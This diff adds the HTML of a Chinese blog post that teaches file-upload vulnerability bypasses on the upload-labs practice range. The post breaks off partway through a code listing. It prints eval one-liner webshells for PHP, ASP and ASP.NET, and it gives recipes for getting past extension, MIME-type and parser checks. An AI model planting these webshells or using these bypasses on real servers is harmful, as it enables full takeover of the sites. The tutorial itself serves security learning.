@@ -1,0 +1,569 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>文件上传漏洞学习 | Wawyw's Blog</title><meta name="keywords" content="Web安全学习,文件上传"><meta name="author" content="wawyw"><meta name="copyright" content="wawyw"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="文件上传简介文件上传，顾名思义就是上传文件的功能行为。将客户端数据以文件形式封装，通过网络协议发送到服务器端。在服务器端解析数据，最终在服务端硬盘上作为真实的文件保存。 漏洞产生原因：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意 PHP 文件，并能够将这些文件传递给 PHP 解释器，就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞学习">
+<meta property="og:url" content="https://www.wawyw.top/posts/13382.html">
+<meta property="og:site_name" content="Wawyw&#39;s Blog">
+<meta property="og:description" content="文件上传简介文件上传，顾名思义就是上传文件的功能行为。将客户端数据以文件形式封装，通过网络协议发送到服务器端。在服务器端解析数据，最终在服务端硬盘上作为真实的文件保存。 漏洞产生原因：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意 PHP 文件，并能够将这些文件传递给 PHP 解释器，就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fileUpload.jpg">
+<meta property="article:published_time" content="2021-04-24T09:40:00.000Z">
+<meta property="article:modified_time" content="2021-04-24T09:48:31.711Z">
+<meta property="article:author" content="wawyw">
+<meta property="article:tag" content="Web安全学习">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fileUpload.jpg"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://www.wawyw.top/posts/13382"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="manifest" href="/image/pwa/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/image/pwa/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/image/pwa/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/image/pwa/16.png"/><link rel="mask-icon" href="/image/pwa/safari-pinned-tab.svg" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#a91e50","bgDark":"#121212","position":"top-center"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-04-24 17:48:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}const fontSizeVal = saveToLocal.get('global-font-size')
+if (fontSizeVal !== undefined) {
+  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+}})()</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/history.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link rel=stylesheet href="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io@1.4.7/css/custom/pace-theme-flash.min.css" ><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zyoushuo/Blog@latest/hexo/css/loading_style_1.css" ><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zyoushuo/Blog@latest/hexo/css/loading_style_2.css" ><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" media="defer" onload="this.media='all'"><style type="text/css">.app-refresh{position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease}.app-refresh-wrap{display:flex;color:#fff;height:100%;align-items:center;justify-content:center}.app-refresh-wrap a{color:#fff;text-decoration:underline;cursor:pointer}</style><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/tags.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/plugins.min.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Wawyw's Blog" type="application/atom+xml">
+</head><body>
+    <div id='loader'>
+        
+        <div class="outer_box">
+        <div class='loader_overlay'></div>
+        <div class='loader_cogs'>
+            <div class='loader_cogs__top'>
+                <div class='top_part'></div>
+                <div class='top_part'></div>
+                <div class='top_part'></div>
+                <div class='top_hole'></div>
+            </div>
+            <div class='loader_cogs__left'>
+                <div class='left_part'></div>
+                <div class='left_part'></div>
+                <div class='left_part'></div>
+                <div class='left_hole'></div>
+            </div>
+            <div class='loader_cogs__bottom'>
+                <div class='bottom_part'></div>
+                <div class='bottom_part'></div>
+                <div class='bottom_part'></div>
+                <div class='bottom_hole'></div>
+            </div>
+            <p style="text-align:center">&nbsp;&nbsp;&nbsp;loading...</p>
+        </div>
+        </div>
+        
+    </div>
+        
+    <script>
+        var endLoading = function () {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+        }
+        window.addEventListener('load',endLoading);
+    </script>
+    
+    <div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/law/"><i class="fa-fw fas fa-balance-scale"></i><span> 须知</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/fcircle"><i class="fa-fw fa fa-puzzle-piece"></i><span> 朋友圈</span></a></div><div class="menus_item"><a class="site-page" href="/speak/"><i class="fa-fw fas fa-quote-left"></i><span> 碎碎念</span></a></div><div class="menus_item"><a class="site-page" href="/README/"><i class="fa-fw fas fa-heart"></i><span> README</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fileUpload.jpg)"><nav id="nav"><span id="blog_name"><img src="https://cdn.jsdelivr.net/gh/wawyw/img/logo.png" alt="logo" style="vertical-align:middle;margin-right:10px"/><a id="site-name" href="/">Wawyw's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/law/"><i class="fa-fw fas fa-balance-scale"></i><span> 须知</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/fcircle"><i class="fa-fw fa fa-puzzle-piece"></i><span> 朋友圈</span></a></div><div class="menus_item"><a class="site-page" href="/speak/"><i class="fa-fw fas fa-quote-left"></i><span> 碎碎念</span></a></div><div class="menus_item"><a class="site-page" href="/README/"><i class="fa-fw fas fa-heart"></i><span> README</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件上传漏洞学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-24T09:40:00.000Z" title="发表于 2021-04-24 17:40:00">2021-04-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-24T09:48:31.711Z" title="更新于 2021-04-24 17:48:31">2021-04-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">Web安全学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="文件上传简介"><a href="#文件上传简介" class="headerlink" title="文件上传简介"></a>文件上传简介</h1><p>文件上传，顾名思义就是上传文件的功能行为。将客户端数据以文件形式封装，通过网络协议发送到服务器端。在服务器端解析数据，最终在服务端硬盘上作为真实的文件保存。</p>
+<p><strong>漏洞产生原因</strong>：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意 PHP 文件，并能够将这些文件传递给 PHP 解释器，就可以在远程服务器上执行任意PHP脚本。另外，服务器配置不当、开源编辑器的上传漏洞、文件上传限制被绕过、文件解析漏洞导致文件执行等都有可能产生文件上传漏洞。</p>
+<p><strong>漏洞危害</strong>:当系统存在文件上传漏洞时，攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，服务器如果对其解析执行则会造成很大的危害。</p>
+<blockquote>
+<p>WebShell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些 asp 或 php 后门文件与网站服务器 web 目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p>
+</blockquote>
+<h1 id="绕过文件检测"><a href="#绕过文件检测" class="headerlink" title="绕过文件检测"></a>绕过文件检测</h1><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般一个文件上传过程中的<strong>检测方式</strong>有∶</p>
+<ol>
+<li>客户端JavaScript检测（检测文件扩展名）</li>
+<li>服务端MIME类型检测（检测content-type内容)</li>
+<li>服务端目录路径检测（检测跟path参数相关的内容)</li>
+<li>服务端文件内容检测（检测内容是否合法或含有恶意代码）等。</li>
+</ol>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416130421578.png" alt="image-20210416130421578"></p>
+<h2 id="绕过客户端检测"><a href="#绕过客户端检测" class="headerlink" title="绕过客户端检测"></a>绕过客户端检测</h2><p>原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法。</p>
+<p>方法：在本地浏览器客户端禁用JS即可;可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实现。</p>
+<p>测试：upload-labs/Pass-01</p>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415231636662.png" alt="image-20210415231636662"></p>
+<p>这里的js检测文件的扩展名，只允许.jpg、.png、.gif文件上传。</p>
+<p>但我们可以禁用此js，或者用burp抓包修改文件类型（上传1.jpg修改为1.php）</p>
+<p>按照惯例，上传最简单的一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415233539502.png" alt="image-20210415233539502"></p>
+<p>查看phpinfo()</p>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234903809.png" alt="image-20210415234903809"></p>
+<p>上菜刀，可以看到整个网站的结构和文件，甚至是暴露了主机的磁盘存储！！可以进行任意非法增删查改！！网站（主机）至此沦陷……</p>
+<blockquote>
+<p>**”中国菜刀”**：仅需要一段简短的代码便可以管理网站。目前支持的服务器端脚本包括: php、ASP、ASP.NET、JSP等，并且支持HTTPS安全连接的网站。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP: &lt;?php @eval($_POST[&#39;mima&#39;]);?&gt;</span><br><span class="line">ASP: &lt;%eval request(&quot;mima&quot;)%&gt;</span><br><span class="line">ASP.NET &lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;mima&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234719164.png" alt="image-20210415234719164"></p>
+<h2 id="绕过MIME类型检测"><a href="#绕过MIME类型检测" class="headerlink" title="绕过MIME类型检测"></a>绕过MIME类型检测</h2><p>原理：检测图片类型文件上传过程中http包的Content-Type字段的值，来判断上传文件是否合法。</p>
+<p>绕过方法：用burpsuite截取并修改数据包中文件的content-type类型进行绕过。</p>
+<p>常见MIME类型：</p>
+<ul>
+<li>html文件：text/html</li>
+<li>txt文件：text/plain</li>
+<li>pdf文档：application/pdf</li>
+<li>word文件：application/msword</li>
+<li>png图片：image/png</li>
+<li>jpeg图片：image/jpeg</li>
+<li>gif图片：image/gif</li>
+</ul>
+<p>测试：upload-labs/Pass-02</p>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132434036.png" alt="image-20210416132434036"></p>
+<p>通过其源码发现仅仅判断content-type类型，因此上传1.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132812123.png" alt="image-20210416132812123"></p>
+<p>成功利用</p>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132939840.png" alt="image-20210416132939840"></p>
+<h2 id="绕过黑名单检测"><a href="#绕过黑名单检测" class="headerlink" title="绕过黑名单检测"></a>绕过黑名单检测</h2><p>黑名单策略</p>
+<p>文件扩展名在黑名单中为不合法，一般有个专门的blacklist文件，里面会包含常见的危险脚本文件。</p>
+<p>绕过方法</p>
+<p><strong>1.后缀大小写绕过</strong>：</p>
+<p>在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。</p>
+<p>测试：upload-labs/Pass-06</p>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221001633.png" alt="image-20210418221001633"></p>
+<p>这里对文件后缀进行了限制，但未对字母大小写做任何处理，可以大小写绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221031495.png" alt="image-20210418221031495"></p>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221148741.png" alt="image-20210418221148741"></p>
+<p><strong>2.空格绕过:</strong></p>
+<p>如果黑名单没有对后缀名进行去空处理，可以通过在后缀名后加空进行绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>
+<p><strong>3.点绕过:</strong></p>
+<p>如果黑名单没有对后缀名进行去.处理，利用Windows系统的文件名特性,会自动去掉后缀名最后的.，通过在文件名后加.进行绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure>
+<p>4.<code>::$DATA</code>绕过:</p>
+<p>如果黑名单没有对后缀名进行去<code>::$DATA</code>处理，利用Windows下NTFS文件系统的一个特性（在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”<code>::$DATA</code>“之前的文件名），可以在后缀名后加<code>::$DATA</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418225806235.png" alt="image-20210418225806235"></p>
+<p><strong>5.双后缀名绕过:</strong></p>
+<p>如果黑名单是将问题后缀名替换为空，可以利用双写绕过进行文件上传。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>6.配合文件解析漏洞绕过:</strong></p>
+<ol>
+<li><p>IIS解析漏洞<br>在IIS6.0的情况下有三种可以利用的手段</p>
+<ul>
+<li>建立<code>*.asa</code>、<code>*.asp</code>格式的文件夹时其目录下的文件都会当做asp文件解析。</li>
+<li>当文件名为<code>*.asp;1.jpg</code>时，IIS会以ASP文件来解析，也就是说;起到了截断作用。</li>
+<li>WebDav漏洞，借助put方法直接向服务器上传危险脚本</li>
+</ul>
+</li>
+<li><p>Apache解析漏洞<br>在Apache 1.X与Apache 2.X中如果碰到文件名为<code>demo.php.test</code>的文件会按php文件进行解析，根据Apache的解析规则，如果碰到不认识的拓展名便会进行遍历，直到碰到能够解析的拓展名。</p>
+<blockquote>
+<p>在Apache根目录的coof/mime.types文件中有详细的可识别拓展名。</p>
+</blockquote>
+</li>
+<li><p>Nginx解析漏洞</p>
+</li>
+</ol>
+<p>在Nginx的服务器环境下，假如成功上传一张名为test.jpg的文件到网站根目录下，如果我们访问<code>www.demo.com/test.jpg/test.php</code>这个虚构的目录服务器则会直接将test.jpg作为php文件进行解析。</p>
+<p><strong>7.htaccess绕过</strong></p>
+<p>当上传<code>.htaccess</code>文件到网站目录时，该目录下的文件会按其配置生效解析。</p>
+<p>条件</p>
+<ul>
+<li>apache服务器</li>
+<li>能够上传.htaccess文件，一般为黑名单限制。</li>
+<li>AllowOverride All（默认配置为关闭None）</li>
+<li>LoadModule rewrite_module modules/mod_rewrite.so #rewrite模块为开启状态</li>
+<li>上传目录具有可执行权限。</li>
+</ul>
+<p>测试：upload-labs/Pass-04</p>
+<p>代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span 